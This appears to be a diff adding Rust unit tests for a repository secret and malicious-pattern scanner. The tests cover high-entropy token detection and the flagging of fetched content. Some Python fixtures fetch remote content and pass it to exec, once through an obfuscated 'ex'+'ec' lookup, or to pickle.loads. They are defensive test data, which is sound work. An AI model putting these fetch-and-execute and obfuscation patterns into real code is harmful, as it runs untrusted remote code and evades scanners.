+        let content = r#"const TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const TOKEN_2022_PROGRAM_ID = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+const TOKEN_ID = "xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX"; // gitleaks:allow
+"#;
+        let tf = files(&[("scripts/simulate-tx.ts", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert_eq!(
+            findings.len(),
+            1,
+            "only the non-PROGRAM_ID key may fire: {findings:?}"
+        );
+        assert!(
+            findings[0].detail.contains("TOKEN_ID = [REDACTED]"),
+            "the finding must be for the real secret: {}",
+            findings[0].detail
+        );
+    }
+
+    // Shape: a usage-comment placeholder — `[ ... 64-byte JSON array ... ]`
+    // is documentation prose; no real secret encoding contains `...`.
+    #[test]
+    fn scan_entropy_skips_placeholder_in_usage_comment() {
+        let content = r#" *   export SOLANA_SECRET="[ ... 64-byte JSON array ... ]"
+const API_KEY = "xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX"; // gitleaks:allow
+"#;
+        let tf = files(&[("scripts/list-markets.ts", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert_eq!(
+            findings.len(),
+            1,
+            "only the real secret may fire: {findings:?}"
+        );
+        assert!(
+            findings[0].detail.contains("API_KEY = [REDACTED]"),
+            "the finding must be for the real secret: {}",
+            findings[0].detail
+        );
+    }
+
+    // ── Round 3 review: the skips must not swallow literals ───────────────
+
+    #[test]
+    fn scan_entropy_fires_on_literal_default_in_parameter_expansion() {
+        // `${API_KEY:-<literal>}` supplies the literal whenever the variable
+        // is unset: the default is a value, so it stays checked.
+        let content = "api_key=\"${API_KEY:-xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX}\" // gitleaks:allow\n";
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIGH_ENTROPY_SECRET),
+            "a literal default is a value and must still fire: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn scan_entropy_fires_on_literal_inside_command_substitution() {
+        // `$(echo <secret>)` hardcodes the secret in the command text: the
+        // substitution body is checked before the reference strip.
+        let content =
+            "api_key=\"$(echo xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX)\" // gitleaks:allow\n";
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIGH_ENTROPY_SECRET),
+            "a literal inside command substitution must still fire: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn scan_entropy_fires_on_secret_value_under_a_file_key() {
+        // `*_FILE` skips a path or a reference, the docker-secrets
+        // convention; the secret itself under a `_FILE` key fails closed.
+        let content =
+            "API_TOKEN_FILE=\"xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX\" // gitleaks:allow\n";
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIGH_ENTROPY_SECRET),
+            "a secret-shaped value under a _FILE key must still fire: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn scan_entropy_fires_on_real_secret_with_trailing_ellipsis() {
+        // A `...` glued to word characters is not placeholder prose: a
+        // real-looking secret with a trailing `...` keeps firing.
+        let content =
+            "api_key=\"xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX...\" // gitleaks:allow\n";
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIGH_ENTROPY_SECRET),
+            "a trailing ellipsis on a real secret must not suppress it: {findings:?}"
+        );
+    }
+
     #[test]
     fn scan_env_files_fires_on_env_file() {
         let tf = files(&[(".env", "SECRET=hunter2"), ("scripts/x.sh", "echo hello")]);
@@ -1637,5 +2300,118 @@ mod tests {
         let scan = scan_sensitive_patterns(&tf);
         let hit = rule_severity(&scan.findings, "VTD-0025").expect("decode still fires");
         assert!(matches!(hit.1, Severity::High | Severity::Critical));
+    }
+
+    // ── Flow-gate review round 2 ───────────────────────────────────────────
+    //
+    // Suppression requires *every* use of the variable to be a recognized
+    // harmless consumer; a single unrecognized use (even alongside a
+    // recognized one) keeps the finding, and a fetched value's `.decode()`
+    // is not itself proof of harmlessness.
+
+    #[test]
+    fn printed_use_alongside_unrecognized_use_keeps_the_fetch_finding() {
+        // `print(payload)` proves nothing about the other use: the finding
+        // the PR body promises ("unknown flows keep full severity") must
+        // survive a recognized consumer co-existing with an unknown sink.
+        let tf = files(&[(
+            "scripts/app.py",
+            "payload = requests.get(u).text\nprint(payload)\ngetattr(builtins, 'ex'+'ec')(payload)\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        let hit = rule_severity(&scan.findings, "VTD-0024")
+            .expect("an unrecognized use must keep the fetch finding");
+        assert!(matches!(hit.1, Severity::High | Severity::Critical));
+    }
+
+    #[test]
+    fn printed_use_alongside_pickle_load_keeps_the_fetch_finding() {
+        // pickle.loads is not in the recognized consumer set: any other use
+        // keeps the finding at full severity.
+        let tf = files(&[(
+            "scripts/app.py",
+            "payload = requests.get(u).text\nprint(payload)\npickle.loads(payload)\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0024").is_some(),
+            "an unrecognized consumer must keep the fetch finding"
+        );
+    }
+
+    #[test]
+    fn fetched_content_decoded_then_executed_still_flags_the_fetch() {
+        // `.decode()` is the normal step before `exec`, so it must not count
+        // as proof of harmlessness for fetched content.
+        let tf = files(&[(
+            "scripts/app.py",
+            "r = requests.get(u).content\nsrc = r.decode()\nexec(src)\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        let hit = rule_severity(&scan.findings, "VTD-0024")
+            .expect("decode-then-exec must keep the fetch finding");
+        assert!(matches!(hit.1, Severity::High | Severity::Critical));
+        assert!(
+            rule_severity(&scan.findings, "VTD-0026").is_some(),
+            "the exec itself must keep its own finding"
+        );
+    }
+
+    #[test]
+    fn consumer_lookalike_calls_are_not_harmless_consumers() {
+        // `fingerprint(payload)` and `myjson.loads(payload)` must not match
+        // the consumer set: a missing left word boundary previously let
+        // them suppress the fetch finding entirely.
+        for content in [
+            "payload = requests.get(u).text\nfingerprint(payload)\nrun(payload)\n",
+            "payload = requests.get(u).text\nmyjson.loads(payload)\nrun(payload)\n",
+        ] {
+            let tf = files(&[("scripts/app.py", content)]);
+            let scan = scan_sensitive_patterns(&tf);
+            assert!(
+                rule_severity(&scan.findings, "VTD-0024").is_some(),
+                "a lookalike consumer name must not suppress: {content:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unclosed_print_cannot_reach_a_later_line() {
+        // Consumer arguments stop at the line end: an unclosed `print(` must
+        // not "reach" a use on the next line.
+        let tf = files(&[(
+            "scripts/app.py",
+            "payload = requests.get(url).text\nprint(\npayload)\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0024").is_some(),
+            "an unclosed print( must not cover a use on the next line"
+        );
+    }
+
+    #[test]
+    fn flow_gate_cost_stays_linear_in_occurrence_count() {
+        // Regression: the gate once compiled fresh per-variable regexes and
+        // rescanned the whole file for every fetch/decode occurrence, so
+        // cost grew occurrences × file size — minutes for a few thousand
+        // occurrences. The per-file facts pass must keep a large generated
+        // file within a generous bound.
+        let mut content = String::new();
+        for i in 0..6000 {
+            content.push_str(&format!("v{i} = base64.b64decode(a{i})\nprint(v{i})\n"));
+        }
+        let tf = files(&[("scripts/big.py", content.as_str())]);
+        let start = std::time::Instant::now();
+        let scan = scan_sensitive_patterns(&tf);
+        let elapsed = start.elapsed();
+        assert!(
+            elapsed.as_secs() < 25,
+            "flow gating must not rescan per occurrence; took {elapsed:?}"
+        );
+        // The scan must still assess correctly: every decode is printed, so
+        // the decode rule fires once, downgraded to Low.
+        let hit = rule_severity(&scan.findings, "VTD-0025").expect("decode still fires");
+        assert!(matches!(hit.1, Severity::Low));
     }
 }
